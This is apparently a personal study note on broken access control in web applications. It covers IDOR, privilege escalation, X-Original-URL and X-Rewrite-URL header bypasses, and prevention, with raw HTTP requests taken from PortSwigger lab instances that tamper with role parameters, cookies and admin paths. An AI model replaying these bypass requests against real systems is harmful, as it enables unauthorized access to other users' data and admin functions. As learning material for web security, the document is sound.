---
title: Broken Access Control
---

# Broken Access Control

---

Broken Access Control is one of the most critical and prevalent web application vulnerabilities (ranked #1 in OWASP Top 10 2021 and 2025). It occurs when an application fails to properly enforce restrictions on what authenticated (or unauthenticated) users are allowed to do, allowing attackers to access resources, perform actions, or view data they should not be permitted to reach.

## **Fundamentals**

**Insecure Direct Object References (IDOR)**

- Direct references to objects (user IDs, file names, database keys) in URLs, parameters, or APIs without proper ownership or authorization checks.

```python
id=12
```

- Allows horizontal privilege escalation (accessing another user's data at the same privilege level).

**Vertical Privilege Escalation**

- Low-privileged users (e.g., regular user) gaining access to high-privileged functions (e.g., admin panels, delete users, modify system settings).

**Horizontal Privilege Escalation**

- Users accessing or modifying resources belonging to other users at the same privilege level (e.g., viewing another customer's profile by changing an ID).

**Missing Function-Level Access Control**

- Server fails to verify whether the authenticated user is authorized to execute a privileged function.
- Administrative or sensitive endpoints remain accessible despite insufficient privileges.
- Authorization is enforced only in the UI, not on the backend.
- **HTTP Method-Based Bypass**
    - Authorization is applied to one HTTP method but missing for another.

```
GET  /admin/deleteUser  → 403 Forbidden
POST /admin/deleteUser  → 200 OK
```

- **Inconsistent Authorization**
    - One endpoint correctly validates permissions, while another endpoint providing the same functionality does not.
- **Unprotected Secondary Functions**
    - Export, import, backup, restore, bulk actions, or similar administrative operations lack authorization checks.

**Other Common Classes**

- Parameter tampering (e.g., modifying `role`, `isAdmin`, `userId`, hidden fields).
- Metadata manipulation (JWT claims, cookies, custom headers).
- Context-dependent or workflow authorization bypasses.
- Force browsing or direct access to hidden endpoints.

## **Attack Surfaces**

- URLs and query parameters (e.g., /user/profile?id=123).
- API endpoints (REST, GraphQL) especially object-level and function-level authorization.
- Form fields, hidden inputs, and POST body parameters.
- Cookies, JWT tokens, session headers, and custom headers.
- File paths, static resources, and admin interfaces.
- Multi-tenant applications (one tenant accessing another's data).
- Unprotected or predictable admin/privileged routes.

## **Exploitation**

#### Admin Panel Through URL Listing

- When a user gains access to functionality they are not authorized to use—such as accessing an admin panel—it is called **Vertical Privilege Escalation**.
- For example any user can access their account by simply going to this URL **`https://example.com/login/user`**  now one can access the admin panel if vulnerable to Broken Access Control like **`https://example.com/login/administrator`**
- The url to admin panel can also hold some unpredictable address like **`/admin-ouvrouv3974v`**  which is not predictable by a hacker
- How ever hacker can directory brute-force or can inspect the website in order to find the unpredictable admin panel URL
- A lots of times the <script> tag hold that information in the source code

```powershell
<script>
	var isAdmin = false;
	if (isAdmin) {
		...
		var adminPanelTag = document.createElement('a');
		adminPanelTag.setAttribute('https://insecure-website.com/administrator-panel-yb556');
		adminPanelTag.innerText = 'Admin panel';
		...
	}
</script>
```

#### Access-Control Param in User Controllable Field

- Some application’s access control mechanism are in the user controllable fields like
    - URL Parameter Values
    - Cookies
    - A hidden Field
- A user can easily change the fields  to gain the admin panel access
- URL Parameters

```powershell
https://insecure-website.com/login/home.jsp?admin=true
https://insecure-website.com/login/home.jsp?role=1
```

- Cookies

```
GET /my-account?id=wiener HTTP/2
Host: 0a630030032ab39985088a3e004400d6.web-security-academy.net
Cookie: **Admin=false**; session=87qLD3g8Yr8DPIXmA80WuOvtYF1koSK1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Referer: https://0a630030032ab39985088a3e004400d6.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, 
```

- During reconnaissance, I identified that the admin panel might be located at **`/admin`**.
I attempted to access common variations such as **`/admin`**, **`/Admin`**, **`/ADMIN`**, and other potential paths like **`/admin/login`** or **`/admin/dashboard`**.
- While accessing these endpoints, I observed that the application restricts access based on a role parameter (**`roleid=2`** for admin users). This indicates that authorization is enforced, but it also highlights a potential area to test for bypasses or misconfigurations.
- **`NOTE:`** As the information is sent as a JSON format, first you have to ensure that the backend is accepting the JSON format. For that i find a input field, email submission which is posting the data as a JSON format, there i change the path and change the JSON value to only `roleid`

```
POST /admin HTTP/2
Host: 0aa3007904e7d0b28027fd4600080041.web-security-academy.net
Cookie: session=Ui7gBf1xJgkvjoMom14PDboG9jPfpufc
Content-Length: 16
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://0aa3007904e7d0b28027fd4600080041.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aa3007904e7d0b28027fd4600080041.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
"roleid":2
}
```

#### Bypass URL Filtered Access Control

- Some of the website set a restriction on the URL such as only a selected users can access the page at **`https://example.com/admin`**
- Restriction based on two factors **`HTTP Methods`** and **`Users Role`**

```
DENY: POST, /admin/deleteUser, managers
```

- Here only users at manager group can access the admin panel
- These Can be bypassed if the application framework supports various non-standard HTTP headers like **`X-Original-URL`** and **`X-Rewrite-URL`**
- Bypass Technique (X-Rewrite-URL): Send request to an allowed endpoint and override the path using:

```python
X-Rewrite-URL: /admin
```

- If the backend honors this header, it may process the request as /admin, bypassing access control checks.

```
POST / HTTP/1.1
X-Original-URL: /admin/deleteUser
...
```

- Sometimes it can be easily bypassed by just changing the `HTTP Method to GET`
- One have to search for a page that can be accessed
- Then add the HTTP Header **`X-Original-URL: /admin`**  so that it will change the value of URL and as the url checked by the filter before it will load the admin page

**NOTE:**

- One have to edit the HTTP Request parameters from the HTTP Request that you have grabbed from the accessible account. Like I have got this HTTP request from the account i am logged in
- I choose any of the GET request as I required  a HTTP request with GET Method

```
GET /my-account?id=wiener HTTP/2
Host: 0a510084032148c08221609000d20036.web-security-academy.net
Cookie: session=KCWKKisIL4sf6sFHorbNcilZ62dVYOMb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Referer: https://0a510084032148c08221609000d20036.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

- To perform an admin work I have to change this request accordingly, Here i just change the Path value to `/admin-roles?username=wiener&action=upgrade` from `/myaccount?id=wiener`

```
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a510084032148c08221609000d20036.web-security-academy.net
Cookie: session=KCWKKisIL4sf6sFHorbNcilZ62dVYOMb
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Referer: https://0a510084032148c08221609000d20036.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

#### URL Matching Discrepancies

**Inconsistent Capitalization**

- Some times the web application treat two end points as a same like ,
- **`/admin/deleteuser`** and **`/ADMIN/DELETEUSER`** will lead you to a same destination.

**Spring Framework**

- If the back-end is using a Spring framework which has the option **`useSuffixPatternMatch` on,** then it will treat the two endpoints as same like **`/admin/deleteuser`** and **`/admin/deleteuser.anything`**
- The Spring 5.3 has this option on by default

**NOTE**

Some times the two end points like, **`/admin/deleteuser`** and **`/admin/deleteuser/`** are treated as different location so the access control can be bypassed.

#### IDOR (Insecure Direct Object Reference)

When the horizontal access control mechanism is applied to the user controllable fields like URL, cookies, HTTP request body parameters then a user can easily modify those values in order to get the admin panel. It is called IDOR vulnerability.

**User ID controlled by request parameter**

- The URL will look like **`https://example.com?user=spider`**
- A user can easily modify the parameter value to another user like **`jester`**  in order to access their account.

**Unpredictable user ID**

Some times the application uses a global identifier for a specific user. You have to find for the user id in that case.

**Information Leak at Redirection**

- Sometimes the application user id is predictable and we can easily get the user access.
- To control this the developers redirect us to the login page when we accessed the account of another user
- But the response is caught by the burp-suite and hence it disclose all of the information in the response body.
- It does seems to be applicable in all cases

**Accessing Sensitive Files From Server**

- A lots of times the web application try to access a static files from server.
- The file contains some of the sensitive information about the users
- When it sends the request to the server to access the file content we grab it and the file name accordingly to get other files saved at the directory. Also can perform directory traversal to access other files at different directories.

```
https://insecure-website.com/static/12144.txt 
```

- EG: A website has a live chat system, and you can download the chat history which is saved at the server. A user can access his chat history file if he can access the other user’s chat history file it can be risky.

#### Referrer Based

- Some times the web application access control mechanism depends upon the HTTP header **`Referrer`**
- It checks if the URL in referrer has the **`/admin`** included or not
- If yes it will allow you to access the admin panel

## **Detection Techniques**

**Manual**

- Authenticate as different users/roles and attempt to access other users' resources or admin functions.
- Fuzz parameters (IDs, roles, actions) using Intruder/Repeater.
- Review all endpoints for authorization logic (server-side only).
- Test with modified cookies, headers, JWTs, and HTTP methods.
- Check for predictable resource identifiers and force browsing.

**Automated**

- Burp Suite Scanner + Autorize extension (compares responses with different sessions/tokens).
- OWASP ZAP with active scan and custom scripts for privilege escalation.
- Fuzzing tools (ffuf, wfuzz) for directory/parameter enumeration.

```python
ffuf -u https://target.com/page?FUZZ=test -w /usr/share/wordlists/params.txt -mc all 
```

## **Impact**

- Unauthorized data exposure (PII, financial records, intellectual property).
- Account takeover or full system compromise.
- Data modification/deletion leading to integrity loss or ransomware-like effects.
- Administrative actions performed by unauthorized users (e.g., adding backdoors).
- Compliance violations (GDPR, HIPAA, PCI-DSS) and reputational damage.
- Lateral movement in internal networks if combined with other flaws.

## **Prevention Techniques**

- Enforce **deny-by-default** policy; explicitly grant access.
- Implement checks at the **business logic / service layer**, not just presentation layer.
- Use secure direct object references (e.g., UUIDs instead of sequential IDs) + ownership validation.
- Apply **principle of least privilege** and Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC).
- Centralize authorization logic (middleware, policies, gates).
- Validate all user-supplied identifiers against the current user's permissions on every request.
- Avoid exposing internal object references; use indirect references or session-based context.
- Implement proper logging and monitoring of access control violations.
- For APIs: Enforce object-level and function-level authorization rigorously.

## **Tools**

- **Burp Suite Professional** (Intruder, Repeater, Autorize, Scanner).
- Burp Suite Extensions
    - Paraminer
    - Pentest Mapper
- **OWASP ZAP** (proxy, active scanner, scripting).
- **Postman** / **Insomnia** with collections for role-based testing.
- **ffuf / wfuzz** for forced browsing and parameter fuzzing.
- **JWT Tool** / **jwt.io** for token manipulation.

## **Good to Read:**

- https://hackerone.com/reports/1539426
- https://hackerone.com/reports/2623715
- https://hackerone.com/reports/2374730

## **References**

- OWASP Top 10 2021 & 2025 – A01: Broken Access Control: [https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/2021/A01_2021-Broken_Access_Control/) and [https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)
- OWASP Authorization Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- PortSwigger Web Security Academy – Access control vulnerabilities: [https://portswigger.net/web-security/access-control](https://portswigger.net/web-security/access-control)
- OWASP Broken Access Control community page and related CWE entries (CWE-639, CWE-285, etc.).
- https://medium.com/@nikhilsk2001/complete-guide-to-broken-access-control-bac-how-to-prevent-it-and-secure-your-apps-85a81905c789
- https://medium.com/@h13.dev/understanding-broken-access-control-a-comprehensive-guide-3742b3017d2e
- https://medium.com/@pirlo0x/broken-access-control-bac-idor-understanding-the-quiet-killer-of-web-app-security-5dc44dcf224b
- [https://medium.com/@defidev59/first-bug-bounty-reward-broken-access-control-e63ba29789f7](https://medium.com/@defidev59/first-bug-bounty-reward-broken-access-control-e63ba29789f7)
- [https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-broken-access-control-vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-broken-access-control-vulnerabilities)
- [https://infosecwriteups.com/how-i-was-able-to-discover-broken-access-control-79982cba80b8](https://infosecwriteups.com/how-i-was-able-to-discover-broken-access-control-79982cba80b8)
- [https://cyberweapons.medium.com/a-story-of-a-700-broken-access-control-2ec2c21f6ffe](https://cyberweapons.medium.com/a-story-of-a-700-broken-access-control-2ec2c21f6ffe)